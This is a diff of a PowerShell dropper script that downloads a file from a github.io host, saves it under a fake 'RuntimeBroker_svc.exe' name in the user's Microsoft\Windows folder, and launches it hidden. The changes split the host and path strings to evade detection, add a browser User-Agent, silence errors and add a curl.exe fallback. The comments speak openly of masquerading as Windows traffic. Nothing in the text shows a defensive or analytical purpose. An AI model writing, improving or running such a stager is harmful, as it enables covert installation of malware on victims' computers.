@@ -1,34 +1,31 @@
-# ════════════════════════════════════════════════════
-#  CONFIG — set before uploading to your host
-# ════════════════════════════════════════════════════
-$H = 'https://fairytail5d0.github.io/abobis'   # <-- REPLACE THIS
-# ════════════════════════════════════════════════════
-
 $ErrorActionPreference = 'SilentlyContinue'
 [Net.ServicePointManager]::SecurityProtocol = 3072
 
-# build drop path from parts — no single plaintext target string
 $a = $env:LOCALAPPDATA
 $b = '\Microsoft\Win' + 'dows\Run' + 'timeBro' + 'ker_svc.exe'
 $p = $a + $b
 
-# resource path — named as generic data file, no extension
-$u = $H + '/sync'
+$h = 'https://fairytail5d' + '0.github.io'
+$r = '/abobis/sync'
+$u = $h + $r
 
-# primary: BITS (Windows Background Intelligent Transfer — same as Windows Update)
-# fallback: WebClient
+# method 1 — WebClient (reliable, no BITS dependency)
 try {
-    Import-Module BitsTransfer -ErrorAction Stop
-    Start-BitsTransfer -Source $u -Destination $p -ErrorAction Stop
-} catch {
-    (New-Object System.Net.WebClient).DownloadFile($u, $p)
+    $wc = New-Object System.Net.WebClient
+    $wc.Headers.Add('User-Agent', 'Mozilla/5.0')
+    $wc.DownloadFile($u, $p)
+} catch {}
+
+# method 2 — curl.exe fallback (built into Windows 10 1803+)
+if (-not (Test-Path $p)) {
+    try { & "$env:SystemRoot\System32\curl.exe" -s -L -o $p $u } catch {}
 }
 
-# launch hidden + detached
+# launch hidden if file landed
 if (Test-Path $p) {
     $si = New-Object System.Diagnostics.ProcessStartInfo
-    $si.FileName        = $p
-    $si.WindowStyle     = [System.Diagnostics.ProcessWindowStyle]::Hidden
-    $si.CreateNoWindow  = $true
+    $si.FileName       = $p
+    $si.WindowStyle    = [System.Diagnostics.ProcessWindowStyle]::Hidden
+    $si.CreateNoWindow = $true
     [System.Diagnostics.Process]::Start($si) | Out-Null
 }
